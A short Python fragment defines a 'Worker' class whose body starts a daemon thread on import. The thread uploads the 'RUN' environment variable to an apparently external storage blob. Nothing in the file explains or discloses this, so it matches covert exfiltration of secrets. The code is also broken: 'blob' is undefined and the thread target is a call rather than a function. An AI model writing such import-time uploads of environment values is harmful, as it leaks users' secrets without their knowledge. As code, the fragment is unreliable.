import os
import threading

def collect():
    blob.upload_from_string(os.getenv("RUN", ""))

class Worker(object):
    threading.Thread(
        daemon=True,
        target=collect(),
    ).start()
